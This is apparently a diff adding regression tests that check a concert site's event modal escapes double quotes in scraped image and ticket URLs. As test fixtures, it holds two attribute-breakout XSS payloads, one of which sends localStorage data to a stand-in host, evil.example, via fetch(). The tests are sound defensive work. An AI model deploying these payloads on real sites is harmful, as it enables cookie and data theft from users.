@@ -168,3 +168,150 @@ test("openModal carries class=\"btn-tickets\" alongside the real data-* attribut
   assert.match(html, /data-venue-slug="cats-cradle"/);
   assert.match(html, /data-show-id="42"/);
 });
+
+// --- Attribute-injection regression coverage (issue #94) ---
+//
+// image_url and ticket_url are scraper-sourced from 21+ third-party venue sites and
+// were, before this fix, interpolated raw into `<img src>`/`<a href>` while every
+// neighbouring field went through _h(). ticket_url's `/^https?:\/\//i` prefix check
+// (safeUrl) only constrains how the string *starts* — it does not stop a `"` later in
+// the string from closing the attribute early. These tests assert the closing quote
+// is neutralized at every render site, and that well-formed URLs are unaffected.
+
+// A `"` placed after a real https:// prefix still passes the safeUrl prefix check,
+// which is exactly why that check alone was never sufficient — only escaping closes
+// the gap.
+const TICKET_URL_BREAKOUT = 'https://evil.example/show?ref=1" onmouseover="alert(document.cookie)';
+// image_url has no prefix check at all in modal.js; a broken `src` fires `onerror`
+// the moment the modal opens, no click required.
+const IMAGE_URL_BREAKOUT = 'x" onerror="fetch(\'//evil.example/\'+localStorage.getItem(\'triangle-shows-favorites\'))';
+
+function _assertNoAttributeBreakout(html) {
+  // The actual vulnerability signature: a *raw* `"` immediately followed by an
+  // onerror=/onmouseover= attribute — that's what a successful break-out renders
+  // as (the injected quote closing src/href early, followed by a sibling event
+  // handler attribute). A raw `"` only ever appears there if escaping failed; once
+  // _h() runs, that quote is `&quot;` (an entity, not a `"` character), so this
+  // regex — unlike a plain substring/word check — does not false-positive on the
+  // harmless case where "onerror=" merely appears as escaped text *inside* the
+  // original, still-intact src/href attribute value.
+  assert.equal(/"\s+on(error|mouseover)\s*=/.test(html), false);
+}
+
+test("_buildEventRow (group modal row) escapes a double-quote in ticket_url so it can't break out of the <a> attribute", () => {
+  const { sandbox } = loadModal({ withAnalytics: false });
+  const ev = {
+    id: "42",
+    title: "Show Title",
+    extendedProps: {
+      venue_slug: "cats-cradle",
+      ticket_url: TICKET_URL_BREAKOUT,
+      support_artists: [],
+    },
+  };
+
+  const html = sandbox._buildEventRow(ev);
+  _assertNoAttributeBreakout(html);
+  assert.match(
+    html,
+    /href="https:\/\/evil\.example\/show\?ref=1&quot; onmouseover=&quot;alert\(document\.cookie\)"/
+  );
+});
+
+test("openModal (single-event modal) escapes a double-quote in ticket_url so it can't break out of the <a> attribute", () => {
+  const { sandbox, elements } = loadModal({ withAnalytics: false });
+  const eventInfo = {
+    event: {
+      id: "42",
+      extendedProps: {
+        date: "2026-08-08",
+        name: "Show Name",
+        venue_slug: "cats-cradle",
+        venue_name: "Cat's Cradle",
+        venue_city: "Carrboro",
+        ticket_url: TICKET_URL_BREAKOUT,
+      },
+    },
+  };
+
+  sandbox.openModal(eventInfo);
+  const html = elements["modal-content"].innerHTML;
+  _assertNoAttributeBreakout(html);
+  assert.match(
+    html,
+    /href="https:\/\/evil\.example\/show\?ref=1&quot; onmouseover=&quot;alert\(document\.cookie\)"/
+  );
+});
+
+test("openModal escapes a double-quote in image_url so the onerror payload can't reach the <img> attribute", () => {
+  const { sandbox, elements } = loadModal({ withAnalytics: false });
+  const eventInfo = {
+    event: {
+      id: "42",
+      extendedProps: {
+        date: "2026-08-08",
+        name: "Show Name",
+        venue_slug: "cats-cradle",
+        venue_name: "Cat's Cradle",
+        venue_city: "Carrboro",
+        image_url: IMAGE_URL_BREAKOUT,
+      },
+    },
+  };
+
+  sandbox.openModal(eventInfo);
+  const html = elements["modal-content"].innerHTML;
+  _assertNoAttributeBreakout(html);
+  // The whole payload, quotes included, must land inside one escaped src="..."
+  // attribute rather than spilling into a sibling onerror="..." attribute.
+  assert.match(
+    html,
+    /<img src="x&quot; onerror=&quot;fetch\('\/\/evil\.example\/'\+localStorage\.getItem\('triangle-shows-favorites'\)\)" alt="Show Name" class="modal-image">/
+  );
+});
+
+test("openModal renders a well-formed https ticket_url with query params as an identical working link", () => {
+  const { sandbox, elements } = loadModal({ withAnalytics: false });
+  const url = "https://tickets.example.com/42?ref=abc&utm_source=site";
+  const eventInfo = {
+    event: {
+      id: "42",
+      extendedProps: {
+        date: "2026-08-08",
+        name: "Show Name",
+        venue_slug: "cats-cradle",
+        venue_name: "Cat's Cradle",
+        venue_city: "Carrboro",
+        ticket_url: url,
+      },
+    },
+  };
+
+  sandbox.openModal(eventInfo);
+  const html = elements["modal-content"].innerHTML;
+  // & is escaped to &amp; in the attribute (correct HTML), which the browser
+  // resolves back to the identical URL — it is not a behavior change.
+  assert.match(html, /href="https:\/\/tickets\.example\.com\/42\?ref=abc&amp;utm_source=site"/);
+});
+
+test("openModal renders a well-formed image_url with query params as an identical working <img src>", () => {
+  const { sandbox, elements } = loadModal({ withAnalytics: false });
+  const url = "https://cdn.example.com/poster.jpg?w=800&h=600";
+  const eventInfo = {
+    event: {
+      id: "42",
+      extendedProps: {
+        date: "2026-08-08",
+        name: "Show Name",
+        venue_slug: "cats-cradle",
+        venue_name: "Cat's Cradle",
+        venue_city: "Carrboro",
+        image_url: url,
+      },
+    },
+  };
+
+  sandbox.openModal(eventInfo);
+  const html = elements["modal-content"].innerHTML;
+  assert.match(html, /<img src="https:\/\/cdn\.example\.com\/poster\.jpg\?w=800&amp;h=600" alt="Show Name" class="modal-image">/);
+});
